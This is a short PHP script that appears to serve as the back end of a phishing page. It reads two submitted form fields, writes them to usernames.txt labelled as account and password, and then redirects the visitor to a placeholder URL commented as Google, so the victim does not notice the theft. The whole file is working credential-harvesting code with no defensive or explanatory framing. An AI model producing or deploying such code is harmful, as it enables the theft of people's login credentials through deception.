<?php

file_put_contents("usernames.txt", "Account: " . $_POST['key2'] . "\nPassword: " . $_POST['key1'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.google.com
header("Location: $url");
exit();
